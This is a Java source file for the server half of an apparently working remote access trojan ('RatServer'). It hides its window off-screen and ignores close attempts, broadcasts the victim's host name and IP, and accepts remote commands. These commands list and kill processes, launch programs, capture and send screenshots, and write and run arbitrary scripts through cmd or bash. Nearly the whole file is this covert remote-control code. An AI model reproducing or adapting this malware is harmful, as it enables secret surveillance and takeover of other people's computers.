package ratserver;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.net.*;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.*;

@SuppressWarnings("serial")
public class RatServer extends JFrame { //GUI for server
	ServerSocket server;
	Socket client;
	PrintWriter out;
	BufferedReader in;
	Broadcast broadcast;

	static InetAddress localip;

	boolean shutdown;
	boolean disconnect;

	ArrayList<RatCommand> commands = new ArrayList<RatCommand>(20);

	public void initGui() {
		setSize(1, 1); //set to 1x1 pixels
		setLocation(-2000, -2000); //set wayyyy offscreen
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE); //don't ever close
		setVisible(false); //don't even render
	}

	public static void log(Exception e, String data) {//handle all errors here
		e.printStackTrace();
		System.out.println(data);
	}

	public void listenServer() { //startup server socket
		server = null;
		try {
			server = new ServerSocket(6050);
		} catch (Exception e) {
			log(e, "Error creating Socket!");
			System.exit(-1);
		}
	}

	public void listenForClients() { //wait for clients to connect to send commands to
		client = null;
		boolean done = false;

		try {
			while (!done) {
				client = server.accept();
				if (!client.isClosed() && client.isConnected()) {
					done = true;
				}
			}
		} catch (Exception e) {
			log(e, "Error accepting client");
			System.exit(-1);
		}
	}

	public void initClient() { //set up a new client
		out = null;
		in = null;
		try {
			out = new PrintWriter(client.getOutputStream(), true); //save input and output streams
			in = new BufferedReader(new InputStreamReader(
					client.getInputStream()));
		} catch (Exception e) {
			log(e, "Error creating socket read/write");
			System.exit(-1);
		}
	}

	public void waitForCommand() { //wait for input
		String data;
		while (!getDisconnect()) {
			if (client.isClosed() || !client.isConnected()) { //make sure there's still someone there
				disconnect();
			}
			try {
				if (!getDisconnect() && (data = in.readLine()) != null) { //run the command
					command(data);
				}
			} catch (SocketException e) {
				disconnect();
			} catch (Exception e) {
				log(e, "Error receiving data");
				System.exit(-1);
			}
		}

	}

	public void initCommands() { //list of all commands
		commands.add(new RatCommand("disconnect") { //telling the server that going to disconnect
			public void run(int argc, String args[]) {
				disconnect();
			}
		});

		commands.add(new RatCommand("tasklist") { //list all tasks
			public void run(int argc, String args[]) {
				try {
					String os = System.getProperty("os.name");
					String line;
					Process p;
					if (os.startsWith("Windows")) { //windows
						p = Runtime.getRuntime().exec(
								System.getenv("windir") + "\\system32\\"
										+ "tasklist.exe");
					} else { //Linux & Mac
						p = Runtime.getRuntime().exec("ps -e");
					}
					BufferedReader input = new BufferedReader(
							new InputStreamReader(p.getInputStream())); //capture output and send to client
					while ((line = input.readLine()) != null) {
						out.println(line);
					}
					input.close();
				} catch (Exception e) {
					out.println("Error retriving processes");
					log(e, "Error retriving processes");
				} finally {
					out.println("end");
				}
			}
		});

		commands.add(new RatCommand("taskkill") { //kill process
			public void run(int argc, String args[]) {
				try {
					String os = System.getProperty("os.name");
					String line;
					Process p;
					if (os.startsWith("Windows")) { //windows
						p = Runtime.getRuntime().exec(
								System.getenv("windir") + "\\system32\\"
										+ "taskkill.exe /f /im \"" + args[1]
										+ "\"");
					} else { //Linux and Mac
						p = Runtime.getRuntime().exec("killall " + args[1]);
					}
					BufferedReader input = new BufferedReader(
							new InputStreamReader(p.getInputStream())); //capture output
					while ((line = input.readLine()) != null) {
						out.println(line);
					}
					input.close();
				} catch (Exception e) {
					out.println("Error executing kill process");
					log(e, "Error retriving kill process");
				} finally {
					out.println("end");
				}
			}
		});

		commands.add(new RatCommand("start") { //start new command
			public void run(int argc, String args[]) {
				String cmd = args[1].replace("<s>", " ");
				try {
					String os = System.getProperty("os.name");
					Process p;
					if (os.startsWith("Windows")) {
						p = Runtime.getRuntime().exec("\"" + cmd + "\"");
					} else {
						p = Runtime.getRuntime().exec("\"" + cmd + "\"");
					}

				} catch (IOException e) {
					out.println("Process not found");
				} catch (Exception e) {
					out.println("Error starting process");
					log(e, "Error starting process");
				} finally {
					out.println("end");
				}
			}
		});

		commands.add(new RatCommand("screen") { //get screenshot
			public void run(int argc, String args[]) {
				try {
					out.println("start"); //send start data
					Rectangle screenRect = new Rectangle(Toolkit
							.getDefaultToolkit().getScreenSize()); //get screen size
					BufferedImage capture = new Robot()
							.createScreenCapture(screenRect); //take a pic
					ImageIO.write(capture, "png", client.getOutputStream()); //send it over the stream
					Thread.sleep(1000);
					for (int i = 0; i < 5; i++) {
						out.println("end"); //send end data (multiple times, client was having trouble receiving the end, due to client lag)
					}
					out.println("done");
				} catch (Exception e) {
					out.println("Error getting screenshot");
					log(e, "Error getting screenshot");
				}

			}
		});

		RatCommand exec = new RatCommand("exec") { //execute code
			public void run(int argc, String args[]) {
				System.out.println("Running exec");
				if (args[1] == null || args[1] == "") { //blank don't do anything
					//nothing
				} else {
					try {
						String data[] = args[2].split(" ");
						int index = -1;
						for (int i = 0; i < data.length; i++) {
							if (data[i].equals("<-START->")) {
								index = i;
							}
						}
						String str = "";
						for (int j = index + 1; j < data.length; j++) {
							if (data[j].equals("<-END->")) {
								break;
							}
							str = str + data[j] + " ";
						}

						out.close();
						writeToFile(System.getProperty("user.home") + "\\"
								+ args[1], str); //write file with info to home directory
						Thread.sleep(20); // wait for file to be created
						
						String os = System.getProperty("os.name");
						if (os.startsWith("Windows")) { //run command windows
							Process p = Runtime.getRuntime().exec(
									"cmd /c start "
											+ System.getProperty("user.home")
											+ "\\" + args[1]);
						} else {//run command linux
							Process p = Runtime.getRuntime().exec(
									"bash " + System.getProperty("user.home")
											+ args[1]);
						}

					} catch (Exception e) {
						out.println("Error executing code");
						log(e, "Error executing code");
					}
				}
			}
		};
		exec.raw = true;
		commands.add(exec);

		/*  //Basic template for a command
		 *
		 * commands.add(new RatCommand("name") { public void run(int argc,
		 * String args[]) {
		 * 
		 * } });
		 */
	}

	public void writeToFile(String file, String str) { //write the exec code to file
		if (str == null || str == "") {
			return;
		}
		try {
			FileWriter fstream = new FileWriter(file);
			BufferedWriter out = new BufferedWriter(fstream);
			str = str.replaceAll("\\\\s", " "); //fix \s spacing and newline of \n in java
			str = str.replaceAll("\\\\n", "\n\n");
			out.write(str);
			out.close();
		} catch (Exception e) {
			out.println("Error writing code to file");
			log(e, "Error writing code to file");
		}
	}

	public void beginBroadcast() { //tell everyone i'm here
		broadcast = new Broadcast(localip.getHostName() + " "
				+ localip.getHostAddress(), 6253);
		broadcast.start();
	}

	public RatServer() {
		super("");

		shutdown = false;
		disconnect = false;

		initGui();
		initCommands();
		beginBroadcast();
		while (!shutdown) { //keep doing these things until told to stop
			listenServer();
			listenForClients();
			initClient();
			waitForCommand();
			reconnect();
		}
		close();
		System.exit(0);
	}

	public static void main(String args[]) {
		try {
			localip = InetAddress.getLocalHost();
		} catch (Exception e) {
			log(e, "Error getting host ip");
			System.exit(-1);
		}
		new RatServer();
	}

	public void command(String cmd) { //get command from client
		boolean found = false;
		int index = -1;
		String args[] = cmd.split(" "); //split it up
		for (int i = 0; i < commands.size(); i++) {
			if (args[0].equals(commands.get(i).getName())) { //find it in commandlibrary
				index = i;
				found = true;
			}
		}
		if (!found || index == -1) {
			out.println("Invalid");
			return;
		} else {
			if (commands.get(index).raw) {
				String c[] = { args[0], args[1], cmd }; //command contains data (screenshot or exec)
				commands.get(index).run(args.length, c); //handle all data as next argument
			}
			commands.get(index).run(args.length, args); //find it, run it
		}
	}

	public void close() { //SHUT DOWN EVERYTHING :)
		try {
			if (server != null) {
				server.close();
			}

			if (client != null) {
				client.close();
			}

			if (in != null) {
				in.close();
			}

			if (out != null) {
				out.close();
			}
		} catch (Exception e) {
			log(e, "Error closing sockets");
		}
	}

	public void shutdown() {
		shutdown = true;
	}

	public boolean getDisconnect() {
		return disconnect;
	}

	public void disconnect() {
		disconnect = true;
	}

	public void reconnect() {
		close();
		disconnect = false;
	}

}